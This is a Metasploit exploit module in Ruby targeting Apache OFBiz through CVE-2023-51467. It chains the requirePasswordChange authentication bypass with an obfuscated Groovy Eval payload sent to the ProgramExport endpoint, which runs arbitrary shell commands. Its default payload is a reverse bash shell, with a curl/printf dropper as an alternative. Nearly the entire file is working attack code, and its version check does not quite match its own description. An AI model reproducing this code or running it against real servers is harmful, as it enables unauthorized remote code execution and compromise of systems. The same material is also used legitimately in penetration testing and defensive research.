##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Apache OFBiz < 18.12.11 Remote Command Execution (CVE-2023-51467)',
      'Description' => %q{
        This module leverages a authentication bypass flaw present in versions of Apache OFBiz prior to 18.12.11. The vulnerability facilitates Server-Side Request Forgery (SSRF) attacks, allowing attackers to execute arbitrary code on the affected server. The issue is cataloged under CVE-2023-51467.
      },
      'Author' => [
        'SonicWall Capture Labs', # CVE-2023-51467 vulnerability discovery
        'Jacob Baines', # Weaponizing CVE-2023-51467
        'Werner Bester (Redshift)' # Metasploit module
      ],
      'References' => [
        [ 'CVE', '2023-51467' ],
        [ 'CWE', '918' ],
        [ 'URL', 'https://vulncheck.com/blog/ofbiz-cve-2023-51467' ],
        [ 'URL', 'https://nvd.nist.gov/vuln/detail/CVE-2023-51467' ],
        [ 'URL', 'https://issues.apache.org/jira/browse/OFBIZ-12873' ]
      ],
      'Targets' => [
        [
          'Unix Command',
          {
            'Platform' => 'unix',
            'Arch' => ARCH_CMD,
            'Type' => :cmd,
            'Payload' => { 'BadChars' => "\x22" },
            'DefaultOptions' => {
              'PAYLOAD' => 'cmd/unix/reverse_bash',
            }
          }
        ],
        [
          'Linux Dropper',
          {
            'Platform' => 'linux',
            'Arch' => [ARCH_X86, ARCH_X64],
            'Type' => :dropper,
            'CmdStagerFlavor' => [  'printf', 'curl' ]
          }
        ]
      ],
      'DefaultTarget' => 0,
      'DefaultOptions' => {
        'RPORT' => 8443
      },
      'DisclosureDate' => '2023-12-26',
      'License' => MSF_LICENSE
    ))

    register_options([
      OptString.new('TARGETURI', [true, 'Base path', '/']),
      OptString.new('VHOST', [true, 'Virtualhost. Required by Ofbiz']),
      OptInt.new('CMD_MAX_LENGTH', [true, 'CMD max line length', 2048]),
      OptInt.new('TIMEOUT', [true, 'HTTP read response timeout (seconds)', 5]),
    ])
  end


  def check
    # Fix up the host field to be non-ip
    hostname = datastore['VHOST']
    if hostname.nil? || hostname.empty?
      hostname = Rex::Socket.getaddress(datastore['RHOST'], true)
    end

    # Prepare the headers and the URL
    headers = { "Host" => "#{hostname}:#{datastore['RPORT']}" }
    url = normalize_uri(target_uri.path, "/webtools/control/main")

    # Send the request
    resp = send_request_cgi({
      'method' => 'GET',
      'uri' => url,
      'headers' => headers
    })

    # Check the response
    unless resp
      vprint_error("Failed to receive response for version check")
      return Exploit::CheckCode::Unknown
    end

    unless resp.code == 200
      vprint_error("Unexpected response code: #{resp.code}")
      return Exploit::CheckCode::Unknown
    end

    unless resp.body.include?("Release")
      vprint_error("Target doesn't have the release version.")
      return Exploit::CheckCode::Unknown
    end

    re = /Release\s*(\d+\.\d+\.?\d*)\s*[\w:\s]*<\/span>/
    version_match = re.match(resp.body)
    unless version_match
      vprint_error("Failed to extract the target's version")
      return Exploit::CheckCode::Unknown
    end

    version = version_match[1]
    print_status("The self-reported version is: #{version}")
    version_array = version.split('.')
    major, minor = version_array[0].to_i, version_array[1].to_i
    point = version_array.length == 3 ? version_array[2].to_i : 0

    if major < 18
      return Exploit::CheckCode::Vulnerable
    elsif major == 18
      if minor < 12
        return Exploit::CheckCode::Vulnerable
      elsif minor == 12
        if version_array.length == 2
          print_status("Could not determine the minor version for 18.12. Could still be vulnerable")
          return Exploit::CheckCode::Unknown
        end
        if point < 10
          return Exploit::CheckCode::Vulnerable
        end
      end
    end

    return Exploit::CheckCode::Safe
  end

  
  # Execute commands on the remote server
  def execute_command(cmd, _opts = {})
    vars = Rex::RandomIdentifier::Generator.new(
      Rex::RandomIdentifier::Generator::JavaOpts
    )
    encoded_cmd = Rex::Text.encode_base64(cmd)
    jcode = <<~JCODE
      String #{vars[:cmd]} = "#{encoded_cmd}";
      byte[] #{vars[:decoded_cmd]};
      try {
        #{vars[:decoded_cmd]} = java.util.Base64.getDecoder().decode(#{vars[:cmd]});
      } catch(groovy.lang.MissingPropertyException e) {
        Object #{vars[:decoder]} = Eval.me("new sun.misc.BASE64Decoder()");
        #{vars[:decoded_cmd]} = #{vars[:decoder]}.decodeBuffer(#{vars[:cmd]});
      }
      String[] #{vars[:cmd_array]} = new String[3];
    JCODE

    if target['Platform'] == 'win'
      jcode << "#{vars[:cmd_array]}[0] = \"cmd.exe\";\n"
      jcode << "#{vars[:cmd_array]}[1] = \"/c\";\n"
    else
      jcode << "#{vars[:cmd_array]}[0] = \"/bin/sh\";\n"
      jcode << "#{vars[:cmd_array]}[1] = \"-c\";\n"
    end
    jcode << "#{vars[:cmd_array]}[2] = new String(#{vars[:decoded_cmd]}, \"UTF-8\");\n"
    jcode << "Runtime.getRuntime().exec(#{vars[:cmd_array]});\n"

    vprint_status("Executing java code: #{jcode}")


    # Bypass Sandbox:
    groovy_payload = "groovyProgram=x=\"'#{Rex::Text.encode_base64(jcode)}'.de\";Eval.me(new String(Eval.me(\"${x}codeBase64()\")));"

    response = send_request_cgi({
      'method'    => 'POST',
      'uri'       => normalize_uri(target_uri.path, 'webtools', 'control', 'ProgramExport'),
      'vars_get'  => {
        'requirePasswordChange' => 'Y',
        'PASSWORD' => 'a',
        'USERNAME' => 'a'
      },
      'data'      => groovy_payload
    }, datastore['TIMEOUT'])

    return response
  end

  # Starts execution of the exploit chain.
  # @return [void]
  def exploit
    
    case target['Type']
    when :cmd
      execute_command(payload.encode)
    when :dropper
      execute_cmdstager
    end
    
  end

end
